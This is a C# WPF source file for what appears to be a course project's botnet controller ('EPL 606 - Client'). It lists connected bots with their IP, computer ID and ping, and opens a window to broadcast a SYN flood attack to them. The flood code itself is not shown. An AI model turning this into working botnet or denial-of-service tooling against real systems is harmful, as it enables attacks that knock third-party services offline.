using Client.Helpers;
using Client.Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Client
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {   
        ConnectionManager Connections = new ConnectionManager();
        int TotalBotsConnected = 0;

        List<Bot> items { get; set; }

        AttackWindow _attackWindow { get; set; }
        public MainWindow()
        {
            InitializeComponent();

            Title = "EPL 606 - Client";

            //Setup Item source for thhe listview
            lvBots.ItemsSource = items = new List<Bot>();

            //Register for Bot notifications
            Connections.OnBotChange += OnBotChange;
            Connections.OnResponceReceived += OnResponceReceived;

        }

        private void OnResponceReceived(object sender, Responce e)
        {
            switch(e.Code)
            {
                case "Ping":
                    UpdatePing(e);
                    break;

                case "Request Info":
                    UpdateInfo(e);
                    break;


                default:
                    break;
            }
        }
        private void UpdateInfo(Responce responce)
        {
            Application.Current.Dispatcher.Invoke(new Action(() =>
            {

                var match = items.SingleOrDefault(x => x.Id == responce.SockId);

                String Info = responce.Data.First() as String;
                String RemoteIP = responce.Data[1] as String;

                match.ComputerId = Info;
                match.IP = RemoteIP;
                lvBots.Items.Refresh();

            }));
        
        }
        private void UpdatePing(Responce responce)
        {
            Application.Current.Dispatcher.Invoke(new Action(() =>
            {
                var match = items.SingleOrDefault(x => x.Id == responce.SockId);

                double? lag = responce.Data.First() as double?;
                match.Lag = (int)lag;
                lvBots.Items.Refresh();

            }));

        }

        private void OnBotChange(object sender, ConnectionEventArgs e)
        {

            if (Application.Current == null)
                return;

            if(e.ConnectionType == 0)
                Application.Current.Dispatcher.Invoke(new Action(() => { AddBotToList(e); }));             //Add to our ListView
            else
                Application.Current.Dispatcher.Invoke(new Action(() => { RemoveBotFromList(e); }));            //Remove from list
        }

        private void AddBotToList(ConnectionEventArgs e)
        {
            if (e.Id == Guid.Empty)
                return;

            items.Add(new Bot() { No = TotalBotsConnected, Id = e.Id, IP = e.RemoteIp });
            lvBots.Items.Refresh();

            TotalBotsConnected++;
        }

        private void RemoveBotFromList(ConnectionEventArgs e)
        {
            if (e.Id == Guid.Empty)
                return;

            var match = items.SingleOrDefault(x=>x.Id == e.Id);

            if (match == null)
                return;

            items.Remove(match);
            lvBots.Items.Refresh();
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            //Close all Sockets upon client exit
            Connections.CloseAllSockets();
        }

        private void SynFloodItem_Click(object sender, RoutedEventArgs e)
        {
            _attackWindow = new AttackWindow(Connections,1,"Broadcast Syn Flood");
            _attackWindow.Owner = this;

            if(_attackWindow.ShowDialog() == true)
            {
                int stop = 1;
               // Broadcast Window closed
            }

        }


       

       
    }
}
